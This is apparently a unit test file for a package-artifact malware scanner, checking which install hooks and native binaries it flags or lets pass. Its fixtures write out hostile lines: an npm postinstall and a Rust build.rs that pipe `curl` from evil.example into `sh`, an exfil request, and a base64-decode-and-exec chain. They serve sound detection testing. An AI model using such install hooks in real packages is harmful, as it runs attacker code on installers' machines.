import io
import tarfile
import tempfile
import unittest
import zipfile
from pathlib import Path

from depshieldx.artifact_analysis import analyze_artifacts


class ArtifactAnalysisTests(unittest.TestCase):
    @staticmethod
    def _elf_binary(*parts: bytes) -> bytes:
        return b"\x7fELF" + b"\x00" * 64 + b"\x00".join(parts)

    @staticmethod
    def _pe_binary(*parts: bytes) -> bytes:
        data = bytearray(b"MZ" + b"\x00" * 0x80)
        data[0x3C:0x40] = (0x40).to_bytes(4, "little")
        data[0x40:0x44] = b"PE\x00\x00"
        for part in parts:
            data.extend(b"\x00")
            data.extend(part)
        return bytes(data)

    def test_high_severity_install_hook_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "badpkg-0.1.0.tar.gz"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b"import requests\nrequests.get('https://evil.example')\n"
                info = tarfile.TarInfo("badpkg-0.1.0/setup.py")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "install_network_access")

    def test_medium_severity_payload_chain_is_reported_without_block(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/module.py",
                    "import base64\npayload = base64.b64decode(data)\nexec(payload)\n",
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "payload_obfuscation")

    def test_plain_base64_usage_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/module.py", "import base64\nvalue = base64.b64decode(data)\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_generic_secret_key_access_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/config.py", "import os\nsecret = os.getenv('SECRET_KEY')\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_explicit_high_risk_credential_env_access_is_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("pkg/creds.py", "import os\nkey = os.getenv('AWS_SECRET_ACCESS_KEY')\n")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "sensitive_env_access")

    def test_native_extension_network_and_exec_combo_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"socket",
                        b"connect",
                        b"execve",
                        b"/bin/sh",
                        b"https://evil.example/payload",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("binary_network_exec_combo", finding_codes)
        self.assertIn("binary_embedded_urls", finding_codes)

    def test_native_extension_symbol_only_network_and_exec_combo_is_medium(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"socket",
                        b"connect",
                        b"execve",
                        b"posix_spawn",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_network_exec_symbols")

    def test_standalone_native_binary_with_embedded_archive_blocks(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "payload.pyd"
            artifact.write_bytes(
                self._elf_binary(
                    b"PyInit_payload",
                    b"benign-symbol",
                )
                + b"\x00" * 32
                + b"PK\x03\x04"
                + b"\x00" * 16
            )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_embedded_payload")

    def test_native_binary_loader_with_encoded_blob_is_medium_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.dylib",
                    self._elf_binary(
                        b"dlopen",
                        b"LoadLibraryA",
                        b"A" * 192,
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["medium_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_encoded_loader")

    def test_benign_native_extension_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.so",
                    self._elf_binary(
                        b"PyInit_pkg",
                        b"PyExc_ImportError",
                        b"libpython3.11.so",
                        b"memcpy",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_benign_pe_extension_with_incidental_zip_magic_is_not_flagged(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.pyd",
                    self._pe_binary(
                        b"PyInit_pkg",
                        b"python312.dll",
                        b"PK\x03\x04",
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_malicious_npm_postinstall_script_blocks_artifact(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "evil-pkg-1.0.0.tgz"
            with tarfile.open(artifact, "w:gz") as archive:
                manifest = (
                    '{"name": "evil-pkg", "version": "1.0.0", '
                    '"scripts": {"postinstall": "node -e \\"require(\'child_process\').exec('
                    '\'curl http://evil.example/payload.sh | sh\')\\""}}'
                ).encode("utf-8")
                info = tarfile.TarInfo("package/package.json")
                info.size = len(manifest)
                archive.addfile(info, io.BytesIO(manifest))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("install_subprocess_js", finding_codes)

    def test_plain_js_file_network_call_is_not_flagged_as_install_script(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.tgz"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b"const res = await fetch('https://example.com');\n"
                info = tarfile.TarInfo("package/index.js")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_malicious_cargo_build_script_blocks_artifact(self):
        # .crate files are confirmed plain gzipped tarballs -- same handling
        # as .tgz/.tar. build.rs is cargo's "install_only" analogue to
        # setup.py/package.json: always executed automatically at build
        # time, before the crate itself compiles.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "evilcrate-1.0.0.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = (
                    b'use std::process::Command;\n'
                    b'fn main() {\n'
                    b'    Command::new("sh").arg("-c").arg("curl http://evil.example/x | sh").output().unwrap();\n'
                    b'    reqwest::blocking::get("http://evil.example/exfil").unwrap();\n'
                    b'}\n'
                )
                info = tarfile.TarInfo("evilcrate-1.0.0/build.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        finding_codes = [finding["code"] for finding in result["findings"]]
        self.assertIn("install_subprocess_rust", finding_codes)
        self.assertIn("install_network_access_rust", finding_codes)

    def test_rustc_version_probe_in_build_rs_is_not_flagged(self):
        # Regression test: reproduced directly against the real, live
        # serde@1.0.219 crate that a blanket `Command::new(` pattern
        # false-positive-blocked it -- serde's real build.rs shells out to
        # `Command::new(rustc).arg("--version")` to feature-gate on the
        # compiler version, an extremely common, benign build.rs idiom
        # (the exact same probe sandbox_wrapper.py's own
        # ALLOWED_SUBPROCESS_PREFIXES already allowlists for PyPI/npm).
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "serde-1.0.219.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = (
                    b'use std::env;\n'
                    b'use std::process::Command;\n'
                    b'fn rustc_minor_version() -> Option<u32> {\n'
                    b'    let rustc = env::var_os("RUSTC")?;\n'
                    b'    let output = Command::new(rustc).arg("--version").output().ok()?;\n'
                    b'    None\n'
                    b'}\n'
                )
                info = tarfile.TarInfo("serde-1.0.219/build.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_plain_rust_file_network_call_is_not_flagged_as_install_script(self):
        # Mirrors the plain-.js-file case above -- only build.rs specifically
        # is install_only, not arbitrary .rs source a crate happens to ship.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.crate"
            with tarfile.open(artifact, "w:gz") as archive:
                data = b'pub fn fetch() { reqwest::blocking::get("https://example.com").unwrap(); }\n'
                info = tarfile.TarInfo("pkg-0.1.0/src/lib.rs")
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_plain_go_file_network_call_is_not_flagged_as_install_script(self):
        # Go module zips are plain zip archives (confirmed directly) -- the
        # existing .whl/.zip branch already opens and scans them, no
        # Go-specific extraction code needed, only ".go" in
        # TEXT_EXTENSIONS -- so this .go file is a real _scan_text()
        # candidate, exercised via the generic zip handler.
        #
        # Go also has no canonical, always-executed build-time script the
        # way build.rs/setup.py are (confirmed directly: init() functions
        # and //go:generate directives only run during a real `go build`/
        # `go generate`, not during `go mod download` alone, and neither is
        # a single agreed-upon filename) -- so, unlike cargo's build.rs, no
        # .go filename gets the install-script-only subprocess/network
        # severity escalation, and none of PATTERN_RULES' few non-
        # install-only entries (payload_obfuscation, sensitive_env_access)
        # recognize Go syntax either (they're hardcoded to Python's
        # os.environ/getenv and Rust's env::var idioms) -- confirmed
        # directly nothing in real Go source currently trips any rule here.
        # Mirrors the plain-.js-file/plain-.rs-file cases above exactly.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "github.com_pkg_example@v1.0.0.zip"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "github.com/pkg/example@v1.0.0/main.go",
                    'package main\n\nimport "net/http"\n\nfunc fetch() {\n\thttp.Get("https://example.com")\n}\n',
                )

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_plain_jar_with_only_class_and_resource_files_is_not_flagged(self):
        # Real jars are plain zip archives (confirmed directly) -- the
        # existing .whl/.zip branch already opens and scans them, so
        # adding ".jar" to that same top-level suffix check (no new
        # extraction code) is what makes this artifact scannable at all.
        # .class files aren't text source (compiled bytecode) and get no
        # TEXT_EXTENSIONS entry, so ordinary jar contents like these
        # trip nothing here -- mirrors the plain-.go-file-in-zip case
        # above: adding a new archive format shouldn't manufacture false
        # positives out of completely ordinary contents.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "com.example_widget-1.0.0.jar"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
                archive.writestr("com/example/Widget.class", b"\xca\xfe\xba\xbe\x00\x00\x00\x41")

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_jar_with_embedded_native_library_is_scanned(self):
        # A real, legitimate pattern (JNI-bundling jars ship a native .so/
        # .dll alongside their .class files) -- NATIVE_BINARY_SUFFIXES
        # already recognizes ".so" regardless of the containing archive
        # format, so this needs no Maven-specific detection code, only
        # ".jar" reaching the same generic zip-member scan every other
        # archive format already gets.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "com.example_native-1.0.0.jar"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n")
                native_payload = b"\x7fELF" + b"\x00" * 60 + b"powershell -enc ZmFrZQ=="
                archive.writestr("native/linux-x86-64/libwidget.so", native_payload)

            result = analyze_artifacts(temp_dir)

        self.assertGreater(result["finding_count"], 0)
        self.assertTrue(any(finding["code"] == "binary_shell_fragments" for finding in result["findings"]))

    def test_plain_nupkg_with_only_dll_and_metadata_is_not_flagged(self):
        # Real .nupkg files are plain zip archives (confirmed directly) --
        # the existing .whl/.zip/.jar branch already opens and scans
        # them, so adding ".nupkg" to that same top-level suffix check
        # (no new extraction code) is what makes this artifact scannable
        # at all. .dll is already in NATIVE_BINARY_SUFFIXES for the
        # unrelated reason Windows PE binaries already needed it, so an
        # ordinary, unremarkable assembly trips nothing here.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "Demo.Widget.1.0.0.nupkg"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("Demo.Widget.nuspec", "<?xml version=\"1.0\"?><package></package>")
                archive.writestr("lib/net8.0/Demo.Widget.dll", b"MZ" + b"\x00" * 62)

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        self.assertEqual(result["finding_count"], 0)

    def test_real_microsoft_signed_dll_url_and_api_names_are_not_flagged(self):
        # Real, confirmed-directly false positive: caught during
        # development against a genuine, widely-used Microsoft NuGet
        # package (System.Xml.XmlDocument 4.3.0). Every Authenticode-
        # code-signed Windows/.NET binary embeds its signing
        # certificate's CRL/cert-chain URLs (crl.microsoft.com, www.
        # microsoft.com/pki/...) as literal strings -- boilerplate
        # code-signing metadata, not attacker-controlled signal -- and
        # this specific DLL's real strings included "IsConnected" and
        # "CreateProcessingInstruction" (both real, ordinary .NET XML
        # DOM API names), which the naive substring checks for
        # "connect"/"createprocess" matched incidentally. Combined, this
        # used to trip a HIGH-severity binary_network_exec_combo finding
        # -- blocking deep-mode installs for an entirely ordinary,
        # first-party Microsoft package.
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "System.Xml.XmlDocument.4.3.0.nupkg"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr("System.Xml.XmlDocument.nuspec", "<?xml version=\"1.0\"?><package></package>")
                dll_strings = (
                    b"http://crl.microsoft.com/pki/crl/products/MicCodSigPCA_08-31-2010.crl\x00"
                    b"http://www.w3.org/2000/xmlns/\x00"
                    b"IsConnected\x00"
                    b"CreateProcessingInstruction\x00"
                )
                archive.writestr("lib/netstandard1.3/System.Xml.XmlDocument.dll", b"MZ" + b"\x00" * 62 + dll_strings)

            result = analyze_artifacts(temp_dir)

        self.assertFalse(result["blocked"])
        codes = {finding["code"] for finding in result["findings"]}
        self.assertNotIn("binary_network_exec_combo", codes)

    def test_pe_extension_with_embedded_second_pe_and_exec_indicators_still_blocks(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            artifact = Path(temp_dir) / "pkg-0.1.0.whl"
            with zipfile.ZipFile(artifact, "w") as archive:
                archive.writestr(
                    "pkg/native.pyd",
                    self._pe_binary(
                        b"PyInit_pkg",
                        b"CreateProcessW",
                        b"cmd.exe",
                        self._pe_binary(b"payload"),
                    ),
                )

            result = analyze_artifacts(temp_dir)

        self.assertTrue(result["blocked"])
        self.assertEqual(result["high_count"], 1)
        self.assertEqual(result["findings"][0]["code"], "binary_embedded_payload")
